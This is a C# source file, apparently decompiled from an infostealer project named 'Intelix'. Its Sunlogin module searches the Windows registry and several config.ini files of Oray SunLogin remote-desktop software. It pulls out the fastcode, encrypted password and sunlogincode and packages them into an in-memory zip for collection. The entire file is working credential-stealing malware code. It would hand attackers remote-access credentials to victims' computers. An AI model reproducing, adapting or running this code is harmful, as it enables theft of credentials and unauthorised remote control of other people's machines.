using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using Intelix.Helper.Data;
using Microsoft.Win32;

namespace Intelix.Targets.Applications
{
	// Token: 0x02000051 RID: 81
	public class Sunlogin : ITarget
	{
		// Token: 0x06000105 RID: 261 RVA: 0x0000F318 File Offset: 0x0000D518
		public void Collect(InMemoryZip zip, Counter counter)
		{
			StringBuilder sb = new StringBuilder();
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "Sunlogin";
			
			string name = "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Oray SunLogin RemoteClient";
			string name2 = ".DEFAULT\\Software\\Oray\\SunLogin\\SunloginClient\\SunloginGreenInfo";
			string name3 = ".DEFAULT\\Software\\Oray\\SunLogin\\SunloginClient\\SunloginInfo";
			
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name);
			RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(name2);
			RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey(name3);
			
			if (registryKey != null)
			{
				string text = Path.Combine(registryKey.GetValue("InstallLocation").ToString(), "config.ini");
				string text2 = File.Exists(text) ? File.ReadAllText(text) : string.Empty;
				string text3 = string.Empty;
				string text4 = string.Empty;
				string text5 = string.Empty;
				if (!string.IsNullOrEmpty(text2))
				{
					text3 = Regex.Match(text2, "fastcode=(.*)", RegexOptions.Multiline).Groups[1].Value;
					text4 = Regex.Match(text2, "encry_pwd=(.*)", RegexOptions.Multiline).Groups[1].Value;
					text5 = Regex.Match(text2, "sunlogincode=(.*)", RegexOptions.Multiline).Groups[1].Value;
				}
				AppendFound(sb, counterApplications, "registry_install", text, text3, text4, text5);
			}
			else if (registryKey2 != null)
			{
				string text6 = registryKey2.GetValue("base_fastcode").ToString();
				string text7 = registryKey2.GetValue("base_encry_pwd").ToString();
				string text8 = registryKey2.GetValue("base_sunlogincode").ToString();
				AppendFound(sb, counterApplications, "registry_greeninfo", string.Empty, text6, text7, text8);
			}
			else if (registryKey3 != null)
			{
				string text9 = registryKey3.GetValue("base_fastcode").ToString();
				string text10 = registryKey3.GetValue("base_encry_pwd").ToString();
				string text11 = registryKey3.GetValue("base_sunlogincode").ToString();
				AppendFound(sb, counterApplications, "registry_info", string.Empty, text9, text10, text11);
			}
			
			string text12 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Oray", "SunloginClient", "config.ini");
			if (File.Exists(text12))
			{
				string input = File.ReadAllText(text12);
				string value = Regex.Match(input, "fastcode=(.*)", RegexOptions.Multiline).Groups[1].Value;
				string value2 = Regex.Match(input, "encry_pwd=(.*)", RegexOptions.Multiline).Groups[1].Value;
				string value3 = Regex.Match(input, "sunlogincode=(.*)", RegexOptions.Multiline).Groups[1].Value;
				AppendFound(sb, counterApplications, "programdata", text12, value, value2, value3);
			}
			
			string text13 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Oray", "SunloginClientLite", "sys_lite_config.ini");
			if (File.Exists(text13))
			{
				string input2 = File.ReadAllText(text13);
				string value4 = Regex.Match(input2, "fastcode=(.*)", RegexOptions.Multiline).Groups[1].Value;
				string value5 = Regex.Match(input2, "encry_pwd=(.*)", RegexOptions.Multiline).Groups[1].Value;
				string value6 = Regex.Match(input2, "sunlogincode=(.*)", RegexOptions.Multiline).Groups[1].Value;
				AppendFound(sb, counterApplications, "user_roaming", text13, value4, value5, value6);
			}
			
			string text14 = "C:\\Windows\\system32\\config\\systemprofile\\AppData\\Roaming\\Oray\\SunloginClient\\sys_config.ini";
			if (File.Exists(text14))
			{
				string input3 = File.ReadAllText(text14);
				string value7 = Regex.Match(input3, "fastcode=(.*)", RegexOptions.Multiline).Groups[1].Value;
				string value8 = Regex.Match(input3, "encry_pwd=(.*)", RegexOptions.Multiline).Groups[1].Value;
				string value9 = Regex.Match(input3, "sunlogincode=(.*)", RegexOptions.Multiline).Groups[1].Value;
				AppendFound(sb, counterApplications, "systemprofile", text14, value7, value8, value9);
			}
			
			if (sb.Length > 0)
			{
				string text15 = "Sunlogin\\info.txt";
				zip.AddTextFile(text15, sb.ToString());
				counterApplications.Files.Add(text15);
				counter.Applications.Add(counterApplications);
			}
		}

		private static void AppendFound(StringBuilder sb, Counter.CounterApplications counterApplications, string source, string path, string fastcode, string encryPwd, string sunlogincode)
		{
			sb.AppendLine("Source: " + source);
			if (!string.IsNullOrEmpty(path))
			{
				sb.AppendLine("Path: " + path);
				counterApplications.Files.Add(path + " => Sunlogin\\info.txt");
			}
			sb.AppendLine("Fastcode: " + fastcode);
			sb.AppendLine("Encry_pwd: " + encryPwd);
			sb.AppendLine("Sunlogincode: " + sunlogincode);
			sb.AppendLine();
		}
	}
}
